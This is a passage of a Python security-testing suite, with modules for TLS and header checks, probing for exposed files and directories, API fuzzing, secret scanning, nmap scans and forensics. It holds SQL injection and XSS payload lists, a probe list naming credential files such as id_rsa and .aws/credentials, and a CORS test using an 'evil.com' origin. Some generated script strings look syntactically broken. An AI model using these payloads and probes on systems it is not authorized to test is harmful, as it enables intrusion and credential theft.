    print(f' TLS Protocol: {tls_version}')
    print(f' Cipher:       {cipher[0] if cipher else "N/A"} ({cipher[2] if cipher else "?"}-bit)')
    print(f' Expiration:   {expiry_line}')
    if san:
        san_names = [v for (k, v) in san if k.lower() == 'dns']
        print(f' SANs:         {", ".join(san_names) if san_names else "None"}')
    warnings = []
    if not verified: warnings.append('Certificate is self-signed or chain broken.')
    if days_left is not None and days_left < 30: warnings.append(f'Certificate expires soon ({days_left} days).')
    if cipher and cipher[2] and cipher[2] < 128: warnings.append(f'Weak cipher ({cipher[2]}-bit).')
    if tls_version in ('TLSv1', 'TLSv1.1', 'SSLv3', 'SSLv2'): warnings.append(f'Outdated protocol: {tls_version}.')
    if warnings:
        print(f'\n{RED}{BOLD}Findings:{RESET}')
        for w in warnings: print(f' {RED}[!] {w}{RESET}')
    else:
        print_success('No immediate certificate issues.')
    try:
        prompt = f"Assess TLS certificate for '{target}': subject='{subject}', issuer='{issuer}', tls='{tls_version}', cipher='{cipher}', expiry='{expiry_line}', verified={verified}. Note risks and actions."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')
SENSITIVE_PATHS = [
    '.git/config', '.git/HEAD', '.env', '.env.bak', '.env.local',
    'config.php.bak', 'wp-config.php.bak', 'backup.zip', 'backup.sql',
    'database.sql', 'dump.sql', 'db_backup.sql', '.DS_Store',
    'id_rsa', '.aws/credentials', 'docker-compose.yml', 'composer.json.bak',
    '.htpasswd', 'web.config.bak', 'phpinfo.php', '.vscode/sftp.json',
    'admin panel', 'phpmyadmin', '.htaccess.bak', 'wp-admin/setup-config.php',
    'config.json.bak', 'settings.py.bak', 'secrets.json', 'token.json',
]

def scan_exposed_files(sandbox, target):
    target = safe_domain(target)
    if not validate_domain(target):
        return
    print_info(f'Probing {len(SENSITIVE_PATHS)} sensitive paths on {target}...')
    output = ''
    if sandbox:
        try:
            script = f"""
import urllib.request, urllib.error
target = {json.dumps(target)}
paths = {json.dumps(SENSITIVE_PATHS)}
found = []
for p in paths:
    for scheme in ('https', 'http'):
        url = f'{{scheme}}://{{target}}/{{p}}'
        try:
            req = urllib.request.Request(url, method='GET', headers={{'User-Agent': 'SecuritySuite/4.0'}})
            with urllib.request.urlopen(req, timeout=8) as resp:
                if resp.status == 200:
                    found.append((url, resp.status, resp.headers.get('Content-Length', '?')))

            break
        except urllib.error.HTTPError as e:
            if e.code not in (404, 403, 401, 400, 500, 503):
                found.append((url, e.code, '?'))
            break
        except Exception:
            continue
print('\\n--- EXPOSED FILE SCAN ---')
if found:
    for url, status, length in found:
        print(f' [!] EXPOSED ({{status}}) {{url}} size={{length}}')
else:
    print(' [OK] No exposed sensitive files detected.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'Exposed file scan failed: {e}')
    if '[!] EXPOSED' in output:
        try:
            prompt = f"These sensitive files were exposed on '{target}':\n\n{output}\n\nExplain risks and remediation."
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI remediation failed: {e}')
    else:
        print_success('No exposure found.')

HEADER_WEIGHTS = {
    'strict-transport-security': 20, 'content-security-policy': 25,
    'x-frame-options': 15, 'x-content-type-options': 15,
    'referrer-policy': 10, 'permissions-policy': 15,
}
HEADER_FIX = {
    'strict-transport-security': "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload",
    'content-security-policy': "Content-Security-Policy: default-src 'self'",
    'x-frame-options': 'X-Frame-Options: DENY',
    'x-content-type-options': 'X-Content-Type-Options: nosniff',
    'referrer-policy': 'Referrer-Policy: strict-origin-when-cross-origin',
    'permissions-policy': 'Permissions-Policy: geolocation=(), microphone=(), camera=()',
}
def grade_from_score(score):
    if score >= 90: return 'A'
    if score >= 75: return 'B'
    if score >= 60: return 'C'
    if score >= 40: return 'D'
    return 'F'

def deep_header_analysis(sandbox, target):
    target = safe_domain(target)
    if not validate_domain(target): return
    print_info(f'Fetching headers for {target}...')
    output = ''
    if sandbox:
        try:
            script = f"""
import urllib.request
target = {json.dumps(target)}
for scheme in ('https', 'http'):
    try:
        req = urllib.request.Request(f'{{scheme}}://{{target}}', headers={{'User-Agent': 'SecuritySuite/4.0'}})
        with urllib.request.urlopen(req, timeout=10) as resp:
            for k, v in resp.getheaders(): print(f'{k}: {v}')
        break
    except Exception as e: print('ERROR: ' + str(e))
"""
            output = run_remote_python(sandbox, script)
        except Exception as e:
            print_error(f'Header fetch failed: {e}')
    headers = {}
    for line in output.splitlines():
        if ':' in line and not line.startswith('ERROR'):
            k, _, v = line.partition(':')
            headers[k.strip().lower()] = v.strip()
    print_section('RAW RESPONSE HEADERS')
    print(output if output.strip() else '(no response)')
    score = 0; max_score = sum(HEADER_WEIGHTS.values()); missing = []
    for h, w in HEADER_WEIGHTS.items():
        if h in headers: score += w
        else: missing.append(h)
    pct = int(score / max_score * 100) if max_score else 0
    grade = grade_from_score(pct)
    print_section(f'HEADER SCORECARD: {target}')
    print(f' Score: {pct}/100   Grade: {BOLD}{grade}{RESET}')
    for h, w in HEADER_WEIGHTS.items():
        status = f'{GREEN}PRESENT{RESET}' if h in headers else f'{RED}MISSING{RESET}'
        print(f'  [{status}] {h} (weight: {w})')
    if missing:
        print(f'\n{RED}{BOLD}Recommended fixes:{RESET}')
        for h in missing: print(f'  {YELLOW}{h}:{RESET} {HEADER_FIX.get(h, "Add this header.")}')
    try:
        prompt = f"HTTP header scorecard for '{target}' (score {pct}/100, grade {grade}), missing: {missing}. Provide prioritized remediation."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI plan failed: {e}')

DIR_WORDLIST = ['admin', 'login', 'dashboard', 'api', 'test', 'dev', 'staging', 'backup', 'wp-admin', 'phpmyadmin',
    'panel', 'manage', 'config', 'setup', 'install', 'debug', 'console', 'manager', 'root', 'secret',
    'private', 'internal', 'portal', 'secure', 'auth', 'oauth', 'webhook', 'uploads', 'files', 'docs']

def dir_brute_forcer(sandbox, target):
    target = safe_domain(target)
    if not validate_domain(target): return
    print_info(f'Brute-forcing directories on {target}...')
    output = ''
    if sandbox:
        try:
            script = f"""
import urllib.request, urllib.error
target = {json.dumps(target)}
words = {json.dumps(DIR_WORDLIST)}
found = []
for w in words:
    for scheme in ('https', 'http'):
        url = f'{{scheme}}://{{target}}/{{w}}/'
        try:
            req = urllib.request.Request(url, method='HEAD', headers={{'User-Agent': 'SecuritySuite/4.0'}})
            with urllib.request.urlopen(req, timeout=6) as resp:
                if resp.status in (200, 301, 302, 401, 403):
                    found.append((url, resp.status))

            break
        except urllib.error.HTTPError as e:
            if e.code in (200, 301, 302, 401, 403):
                found.append((url, e.code))

            break
        except Exception: continue
print('\\n--- DIRECTORY BRUTE FORCE ---')
if found:
    for url, status in found: print(f' [+] {{status}}  {{url}})
    print('\\nTotal found: ' + str(len(found)))
else:
    print(' [!] No directories found.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'Directory brute force failed: {e}')
    if output and '[+]' in output:
        try:
            prompt = f"These directories were found on '{target}':\n\n{output}\n\nAssess security risks."
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI assessment failed: {e}')

API_ENDPOINTS = ['/api/v1/users', '/api/v1/admin', '/api/health', '/api/status', '/api/docs',
    '/swagger.json', '/openapi.json', '/api/v1/login', '/api/v1/register', '/graphql',
    '/api/v1/config', '/api/v1/secrets', '/api/v1/backup', '/api/v1/debug', '/api/v1/test']

def api_endpoint_fuzzer(sandbox, target):
    target = safe_domain(target)
    if not validate_domain(target): return
    print_info(f'Fuzzing API endpoints on {target}...')
    output = ''
    if sandbox:
        try:
            script = f"""
import urllib.request, urllib.error, json
target = {json.dumps(target)}
endpoints = {json.dumps(API_ENDPOINTS)}
found = []
for ep in endpoints:
    for scheme in ('https', 'http'):
        url = f'{{scheme}}://{{target}}{{ep}}'
        try:
            req = urllib.request.Request(url, headers={{'User-Agent': 'SecuritySuite/4.0', 'Accept': 'application/json'}})
            with urllib.request.urlopen(req, timeout=6) as resp:
                body = resp.read(500).decode('utf-8', errors='ignore')
                found.append((url, resp.status, body[:100]))

            break
        except urllib.error.HTTPError as e:
            if e.code != 404:
                found.append((url, e.code, ''))

            break
        except Exception: continue
print('\n--- API ENDPOINT FUZZER ---')
if found:
    for url, status, body in found: print(f' [+] {{status}}  {{url}}  {{body}}')
else:
    print(' [!] No API endpoints discovered.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'API fuzzer failed: {e}')
    if output and '[+]' in output:
        try:
            prompt = f"These API endpoints responded on '{target}':\n\n{output}\n\nAssess security implications."
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI assessment failed: {e}')

SQLI_PAYLOADS = {
    'Auth Bypass': ["' OR '1'='1", "' OR '1'='1' -- ", "admin' -- ", "' OR 1=1#"],
    'Error-Based': ["'", '"', "' AND 1=CONVERT(int, (SELECT @@version)) --"],
    'UNION-Based': ["' UNION SELECT NULL-- ", "' UNION SELECT NULL,NULL-- ", "' UNION SELECT username, password FROM users-- "],
    'Boolean Blind': ["' AND 1=1-- ", "' AND 1=2-- "],
    'Time Blind': ["'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)-- "],
}
XSS_PAYLOADS = {
    'Reflected': ["<script>alert('XSS')</script>", '"><script>alert(\'XSS\')</script>'],
    'Attribute': ['" onmouseover="alert(\'XSS\')', "' autofocus onfocus=alert('XSS') '"],
    'Event': ["<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>"],
    'URI': ["javascript:alert('XSS')"],
}

def generate_payloads():
    print(f"\n{YELLOW}{BOLD}NOTE: Only use on systems you own or are authorized to test.{RESET}")
    print(f'{BOLD}Choose category:{RESET}')
    print(' 1. SQL Injection')
    print(' 2. Cross-Site Scripting (XSS)')
    choice = get_input(f"{BOLD}Select (1-2): {RESET}")
    if choice is None: return
    dataset = SQLI_PAYLOADS if choice == '1' else XSS_PAYLOADS if choice == '2' else None
    if not dataset:
        print_error('Invalid choice.'); return
    label = 'SQL INJECTION' if choice == '1' else 'XSS'
    print_section(f'{label} TEST PAYLOADS')
    for category, payloads in dataset.items():
        print(f'\n {BOLD}{category}:{RESET}')
        for p in payloads: print(f'   {CYAN}{p}{RESET}')
    try:
        prompt = f"Brief professional methodology for responsibly using {label} payloads during authorized assessment, including detection and documentation. No new payloads."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI methodology failed: {e}')

def jwt_analyzer():
    token = get_input(f"{BOLD}Enter JWT token to analyze: {RESET}")
    if not token: print_error('No token entered.'); return
    parts = token.split('.')
    if len(parts) != 3:
        print_error('Invalid JWT format. Expected 3 parts separated by dots.'); return
    print_section('JWT TOKEN ANALYSIS')
    for i, label in [(0, 'HEADER'), (1, 'PAYLOAD')]:
        try:
            padded = parts[i] + '=' * (4 - len(parts[i]) % 4)
            decoded = base64.urlsafe_b64decode(padded).decode('utf-8', errors='ignore')
            data = json.loads(decoded)
            print(f'\n {BOLD}{label}:{RESET}')
            for k, v in data.items(): print(f'   {k}: {v}')
        except Exception as e:
            print_error(f'Could not decode {label}: {e}')
    print(f'\n {BOLD}SIGNATURE:{RESET} (raw) {parts[2][:20]}...')
    try:
        prompt = f"Analyze this JWT token structure: algorithm in header, claims in payload. Note security risks like 'none' alg, weak secrets, or excessive expiry. Token: {token[:50]}..."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI JWT analysis failed: {e}')

SECRET_PATTERNS = {
    'AWS Access Key': r'AKIA[0-9A-Z]{16}',
    'AWS Secret Key': r'[0-9a-zA-Z/+]{40}',
    'GitHub Token': r'ghp_[0-9a-zA-Z]{36}',
    'Slack Token': r'xox[baprs]-[0-9a-zA-Z]{10,48}',
    'Private Key': r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
    'API Key Generic': r'''(?i)(api[_-]?key|apikey)\s*[:=]\s*["']?[a-z0-9]{32,}["']?''',
    'Password in Code': r'''(?i)(password|passwd|pwd)\s*[:=]\s*["'][^"']{4,}["']''',
    'Database URL': r'''(?i)(mongodb|mysql|postgres|redis)://[^\s"']+''',
}

def secret_scanner():
    path = get_input(f"{BOLD}Enter file or directory path to scan: {RESET}")
    if not path or not os.path.exists(path):
        print_error('Path not found.'); return
    print_info('Scanning for secrets...')
    findings = []
    files_scanned = 0
    try:
        if os.path.isfile(path):
            targets = [path]
        else:
            targets = [os.path.join(root, f) for root, _, files in os.walk(path) for f in files if f.endswith(('.py', '.js', '.json', '.yaml', '.yml', '.env', '.txt', '.config', '.php', '.java', '.go'))]
        for fp in targets:
            files_scanned += 1
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                for name, pattern in SECRET_PATTERNS.items():
                    for match in re.finditer(pattern, content):
                        line_num = content[:match.start()].count('\n') + 1
                        snippet = content[max(0, match.start()-20):match.end()+20].replace('\n', ' ')
                        findings.append((fp, line_num, name, snippet))
            except Exception:
                continue
    except Exception as e:
        print_error(f'Scan failed: {e}'); return
    print_section(f'SECRET SCAN RESULTS ({files_scanned} files)')
    if findings:
        for fp, line, name, snippet in findings[:30]:
            print(f' {RED}[!]{RESET} {name} in {CYAN}{fp}{RESET}:{line}')
            print(f'     {GRAY}{snippet}{RESET}')
        if len(findings) > 30:
            print_warn(f'... and {len(findings)-30} more findings.')
    else:
        print_success('No secrets detected.')
    try:
        prompt = f"Found {len(findings)} potential secrets in {files_scanned} files. Explain risks of exposed secrets and remediation steps."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')

def api_security_scanner(sandbox, target):
    target = safe_domain(target)
    if not validate_domain(target): return
    print_info(f'Scanning API security on {target}...')
    output = ''
    if sandbox:
        try:
            script = f"""
import urllib.request, urllib.error, json
target = {json.dumps(target)}
checks = []
# Check CORS
try:
    req = urllib.request.Request(f'https://{target}/api/test', headers={{'Origin': 'https://evil.com', 'User-Agent': 'SecuritySuite/4.0'}})
    with urllib.request.urlopen(req, timeout=8) as resp:
        acao = resp.headers.get('Access-Control-Allow-Origin', '')
        if acao == '*' or 'evil.com' in acao:
            checks.append('CORS: Misconfigured - allows arbitrary origins')
        else:
            checks.append('CORS: Restricted')
except Exception as e:
    checks.append('CORS: Check failed (' + str(e) + ')')
# Check for verbose errors
try:
    req = urllib.request.Request(f'https://{target}/api/%%invalid%%', headers={{'User-Agent': 'SecuritySuite/4.0'}})
    with urllib.request.urlopen(req, timeout=8) as resp:
        body = resp.read(500).decode('utf-8', errors='ignore')
        if 'stack' in body.lower() or 'trace' in body.lower() or 'error' in body.lower():
            checks.append('Error Handling: Verbose errors exposed')
        else:
            checks.append('Error Handling: Generic errors')
except urllib.error.HTTPError as e:
    body = e.read(500).decode('utf-8', errors='ignore') if hasattr(e, 'read') else ''
    if 'stack' in body.lower() or 'trace' in body.lower():
        checks.append('Error Handling: Verbose errors exposed')
    else:
        checks.append('Error Handling: Generic errors')
except Exception as e:
    checks.append('Error Handling: Check failed')
# Check for rate limiting headers
try:
    req = urllib.request.Request(f'https://{target}/', headers={{'User-Agent': 'SecuritySuite/4.0'}})
    with urllib.request.urlopen(req, timeout=8) as resp:
        if resp.headers.get('X-RateLimit-Limit') or resp.headers.get('RateLimit-Limit'):
            checks.append('Rate Limiting: Headers present')
        else:
            checks.append('Rate Limiting: No headers detected')
except Exception:
    checks.append('Rate Limiting: Check failed')
print('\n--- API SECURITY SCAN ---')
for c in checks: print(' [+] ' + c)
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'API security scan failed: {e}')
    if output:
        try:
            prompt = f"API security scan results for '{target}':\n\n{output}\n\nAssess risks and recommend fixes."
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI assessment failed: {e}')
def match_port_vulnerabilities(sandbox, target):
    if not validate_domain(target) and not validate_ip(target):
        return
    print_info(f'Running detailed Nmap on {target}...')
    output = ''
    if sandbox:
        try:
            sandbox.process.exec('sudo apt update -y > /dev/null 2>&1 && sudo apt install -y nmap > /dev/null 2>&1')
            scan_res = sandbox.process.exec(f'nmap -sV -sC -F {target}')
            output = scan_res.result if hasattr(scan_res, 'result') else str(scan_res)
        except Exception as e:
            print_error(f'Port scan failed: {e}')
    print_section('DETAILED SERVICE SCAN')
    print(output if output else '(No output)')
    if output:
        try:
            prompt = f"Nmap scan for '{target}':\n\n{output}\n\nFor each open port/service, list relevant CVEs, rate severity (Low/Medium/High/Critical), and give one-line mitigation. Order by severity."
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI CVE correlation failed: {e}')

def whois_geo_tracker(sandbox, target):
    target = safe_domain(target)
    if not validate_domain(target): return
    print_info(f'Resolving {target} and gathering WHOIS + geo data...')
    whois_text = ''
    if sandbox:
        try:
            sandbox.process.exec('sudo apt update -y > /dev/null 2>&1 && sudo apt install -y whois dnsutils > /dev/null 2>&1')
        except Exception as e:
            print_warn(f'Package install warning: {e}')
        try:
            whois_res = sandbox.process.exec(f'whois {target} | head -n 40')
            whois_text = whois_res.result if hasattr(whois_res, 'result') else str(whois_res)
            print_section('WHOIS REGISTRAR DATA')
            print(whois_text)
        except Exception as e:
            print_error(f'WHOIS failed: {e}')
    geo_output = ''
    if sandbox:
        try:
            script = f"""
import json, socket, urllib.request
target = {json.dumps(target)}
try:
    ip = socket.gethostbyname(target)
    print('Resolved IP: ' + ip)
    url = 'http://ip-api.com/json/' + ip + '?fields=status,message,country,regionName,city,isp,org,as,query'
    with urllib.request.urlopen(url, timeout=10) as resp:
        data = json.loads(resp.read().decode())
    if data.get('status') == 'success':
        print('Country:      ' + str(data.get('country')))
        print('Region:       ' + str(data.get('regionName')))
        print('City:         ' + str(data.get('city')))
        print('ISP:          ' + str(data.get('isp')))
        print('Organization: ' + str(data.get('org')))
        print('ASN:          ' + str(data.get('as')))
    else:
        print('Geo lookup failed: ' + str(data.get('message')))
except Exception as e:
    print('[!] Error: ' + str(e))
"""
            geo_output = run_remote_python(sandbox, script)
            print_section('IP GEO-LOCATION')
            print(geo_output)
        except Exception as e:
            print_error(f'Geo lookup failed: {e}')
    try:
        prompt = f"Summarize infrastructure risk for '{target}' based on WHOIS and geo data:\n\n{whois_text}\n\n{geo_output}"
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI summary failed: {e}')

def wifi_security_auditor():
    print_info('WiFi Security Auditor')
    print('This module analyzes WiFi security configurations and provides hardening advice.')
    ssid = get_input(f"{BOLD}Enter WiFi SSID (or leave blank for general advice): {RESET}")
    security_type = get_input(f"{BOLD}Enter security type (WEP/WPA/WPA2/WPA3/Unknown): {RESET}")
    try:
        prompt = f"Analyze WiFi security for SSID '{ssid or 'Unknown'}' with security type '{security_type or 'Unknown'}'. Explain vulnerabilities and hardening steps."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI WiFi analysis failed: {e}')

def firewall_config_analyzer():
    print_info('Firewall Config Analyzer')
    print('Paste your firewall rules (iptables/ufw/firewalld) below.')
    print(f"{YELLOW}(Type 'END' on its own line when finished){RESET}")
    rules = []
    load_theme()
    while True:
        line = get_input('')
        if line is None or line.strip() == 'END': break
        rules.append(line)
    rules_text = '\n'.join(rules).strip()
    if not rules_text:
        print_error('No rules entered.'); return
    try:
        prompt = f"Analyze these firewall rules for security gaps, overly permissive rules, and missing protections. Be concise:\n\n{rules_text[:4000]}"
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI firewall analysis failed: {e}')

def network_traffic_analyzer():
    print_info('Network Traffic Analyzer')
    print('This module analyzes network connection data.')
    choice = get_input(f"{BOLD}Select source: [1] Live netstat  [2] Paste connection list: {RESET}")
    data = ''
    if choice == '1':
        try:
            result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=10)
            data = result.stdout
        except Exception as e:
            print_error(f'netstat failed: {e}'); return
    elif choice == '2':
        print('Paste connection list (IP:port format). Type END when done:')
        lines = []
        while True:
            line = get_input('')
            if line is None or line.strip() == 'END': break
            lines.append(line)
        data = '\n'.join(lines)
    else:
        print_error('Invalid choice.'); return
    if not data.strip():
        print_error('No data collected.'); return
    print_section('CONNECTION ANALYSIS')
    suspicious = []
    for line in data.splitlines():
        for ip in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line):
            if ip.startswith(('10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.', '172.31.')):
                continue
            suspicious.append(ip)
    if suspicious:
        unique = list(set(suspicious))[:20]
        print_warn(f'Detected {len(suspicious)} external connections.')
        for ip in unique: print(f'   {ip}')
    else:
        print_success('No suspicious external connections detected.')
    try:
        prompt = f"Analyze these network connections. Flag suspicious IPs, unusual ports, or potential C2 traffic:\n\n{data[:3000]}"
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI traffic analysis failed: {e}')

def pcap_analyzer():
    print_info('PCAP Analyzer')
    print('This module analyzes packet capture summaries.')
    print('Paste tcpdump output or connection summary. Type END when done:')
    lines = []
    while True:
        line = get_input('')
        if line is None or line.strip() == 'END': break
        lines.append(line)
    data = '\n'.join(lines).strip()
    if not data:
        print_error('No data entered.'); return
    print_section('PCAP ANALYSIS')
    protocols = {}
    for line in data.splitlines():
        for proto in ['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'DNS', 'SSH', 'FTP']:
            if proto in line.upper():
                protocols[proto] = protocols.get(proto, 0) + 1
    if protocols:
        print('Protocol distribution:')
        for proto, count in sorted(protocols.items(), key=lambda x: -x[1])[:10]:
            print(f'   {proto}: {count}')
    try:
        prompt = f"Analyze this network capture summary. Identify anomalies, suspicious patterns, or potential attacks:\n\n{data[:4000]}"
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI PCAP analysis failed: {e}')

def arp_spoofing_detector(sandbox):
    print_info('ARP Spoofing Detector')
    output = ''
    if sandbox:
        try:
            script = r"""
import subprocess, re, sys
try:
    result = subprocess.run(['ip', 'neigh'], capture_output=True, text=True, timeout=10)
    arp_table = result.stdout
except Exception:
    try:
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=10)
        arp_table = result.stdout
    except Exception as e:
        print('[!] Could not read ARP table: ' + str(e))
        sys.exit()
print('\n--- ARP TABLE ---')
print(arp_table)
macs = {}
for line in arp_table.splitlines():
    macs_found = re.findall(r'([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}', line)
    for mac in macs_found:
        macs[mac] = macs.get(mac, 0) + 1
duplicates = {m: c for m, c in macs.items() if c > 1}
if duplicates:
    print('\n[!] DUPLICATE MACS DETECTED:')
    for m, c in duplicates.items(): print(f'   {m} appears {c} times')
    print('\nWARNING: Possible ARP spoofing or MITM attack!')
else:
    print('\n[OK] No duplicate MAC addresses detected.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'ARP detection failed: {e}')
    else:
        print_error('Sandbox required for ARP detection.')
    if output and '[!]' in output:
        try:
            prompt = f"ARP analysis results:\n\n{output}\n\nExplain ARP spoofing risks and mitigation steps."
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI assessment failed: {e}')

def dns_tunneling_detector(sandbox):
    print_info('DNS Tunneling Detector')
    print('This module analyzes DNS query patterns for tunneling indicators.')
    output = ''
    if sandbox:
        try:
            script = r"""
import subprocess, re
try:
    result = subprocess.run(['cat', '/etc/resolv.conf'], capture_output=True, text=True, timeout=5)
    print('--- DNS CONFIG ---')
    print(result.stdout)
except Exception as e:
    print('[!] Could not read DNS config: ' + str(e))
try:
    result = subprocess.run(['ss', '-lun'], capture_output=True, text=True, timeout=5)
    if '53' in result.stdout:
        print('\n[+] DNS port (53) is listening.')
except Exception:
    pass
print('\n--- DNS TUNNELING INDICATORS ---')
print('1. Unusually long subdomain queries')
print('2. High volume of DNS queries to single domain')
print('3. TXT records with encoded data')
print('4. Queries at regular intervals (beaconing)')
print('5. DNS queries to rare TLDs')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'DNS tunnel detection failed: {e}')
    else:
        print_error('Sandbox required for DNS tunnel detection.')
    try:
        prompt = 'Explain DNS tunneling detection techniques and how to monitor for it in enterprise networks.'
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')
HASH_LENGTH_MAP = {32: 'MD5', 40: 'SHA-1', 56: 'SHA-224', 64: 'SHA-256', 96: 'SHA-384', 128: 'SHA-512'}

def calculate_entropy(password):
    pool = 0
    if re.search(r'[a-z]', password): pool += 26
    if re.search(r'[A-Z]', password): pool += 26
    if re.search(r'[0-9]', password): pool += 10
    if re.search(r'[^a-zA-Z0-9]', password): pool += 33
    return len(password) * math.log2(pool) if pool else 0.0

def analyze_password_or_hash():
    value = get_input(f"{BOLD}Enter password or hash to analyze: {RESET}")
    if not value: print_error('Nothing entered.'); return
    is_hex = bool(re.fullmatch(r'[0-9a-fA-F]+', value))
    looks_bcrypt = value.startswith(('$2a$', '$2b$', '$2y$'))
    if looks_bcrypt:
        print_section('HASH IDENTIFICATION')
        print(' Detected: bcrypt (adaptive, salted — strong if cost >= 10)')
        prompt = f"Explain bcrypt resistance to cracking and best cost factors. Hash prefix: {value[:7]}..."
    elif is_hex and len(value) in HASH_LENGTH_MAP:
        htype = HASH_LENGTH_MAP[len(value)]
        print_section('HASH IDENTIFICATION')
        print(f' Hex length: {len(value)} | Likely type: {htype}')
        print(' Note: This tool does NOT crack hashes.')
        prompt = f"A {htype} hash was analyzed. Explain resistance to rainbow tables and GPU brute force. Is it acceptable for password storage in 2026?"
    else:
        entropy = calculate_entropy(value)
        length = len(value)
        common = bool(re.search(r'(1234|password|qwerty|letmein|admin)', value, re.I))
        if entropy < 28: strength = f'{RED}Very Weak{RESET}'
        elif entropy < 36: strength = f'{RED}Weak{RESET}'
        elif entropy < 60: strength = f'{YELLOW}Moderate{RESET}'
        elif entropy < 80: strength = f'{GREEN}Strong{RESET}'
        else: strength = f'{GREEN}{BOLD}Very Strong{RESET}'
        print_section('PASSWORD STRENGTH REPORT')
        print(f' Length:    {length} chars')
        print(f' Entropy:   {entropy:.1f} bits')
        print(f' Strength:  {strength}')
        if common: print_warn('Contains common/predictable pattern.')
        prompt = f"Password length {length}, entropy {entropy:.1f} bits. Common pattern: {common}. Explain time-to-crack vs GPU attacks and strengthening advice."
    try:
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI assessment failed: {e}')

def log_file_analyzer():
    path = get_input(f"{BOLD}Enter log file path (auth.log, access.log, etc.): {RESET}")
    if not path or not os.path.exists(path):
        print_error('File not found.'); return
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        print_error(f'Could not read file: {e}'); return
    print_info(f'Analyzing {len(lines)} log lines...')
    failed_logins = 0
    sudo_attempts = 0
    suspicious_ips = {}
    for i, line in enumerate(lines):
        lower = line.lower()
        if 'failed password' in lower or 'authentication failure' in lower:
            failed_logins += 1
        if 'sudo:' in lower and 'command' in lower:
            sudo_attempts += 1
        for ip in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', line):
            suspicious_ips[ip] = suspicious_ips.get(ip, 0) + 1
    print_section('LOG ANALYSIS RESULTS')
    print(f' Failed login attempts: {failed_logins}')
    print(f' Sudo command executions: {sudo_attempts}')
    if suspicious_ips:
        top_ips = sorted(suspicious_ips.items(), key=lambda x: -x[1])[:10]
        print(f' Top source IPs:')
        for ip, count in top_ips:
            print(f'   {ip}: {count} occurrences')
    try:
        sample = ''.join(lines[:100])
        prompt = f"Analyze this log file sample. Identify attack patterns, brute force attempts, or anomalies:\n\n{sample[:3000]}"
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI log analysis failed: {e}')

def registry_forensics():
    print_info('Registry Forensics (Windows)')
    print('Analyzing common persistence locations...')
    if sys.platform != 'win32':
        print_warn('This system is not Windows. Showing simulated analysis.')
    try:
        import winreg
        keys_to_check = [
            ('HKLM', 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'),
            ('HKCU', 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'),
            ('HKLM', 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'),
        ]
        print_section('REGISTRY PERSISTENCE CHECK')
        for hive, key_path in keys_to_check:
            try:
                if hive == 'HKLM':
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                else:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                print(f'\n {BOLD}{hive}{key_path}:{RESET}')
                i = 0
                while True:
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        print(f'   {name}: {value}')
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except Exception as e:
                print(f'   [!] Could not access: {e}')
    except ImportError:
        print_warn('winreg not available. Showing analysis guidance.')
    try:
        prompt = 'Explain Windows registry persistence mechanisms used by malware and how to detect them during forensic analysis.'
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI registry analysis failed: {e}')

def memory_dump_analyzer():
    path = get_input(f"{BOLD}Enter memory dump or binary file path: {RESET}")
    if not path or not os.path.exists(path):
        print_error('File not found.'); return
    print_info('Extracting printable strings...')
    try:
        with open(path, 'rb') as f:
            data = f.read(5 * 1024 * 1024)  # 5MB limit
        strings = re.findall(b'[\x20-\x7e]{8,}', data)
        decoded = [s.decode('ascii', errors='ignore') for s in strings]
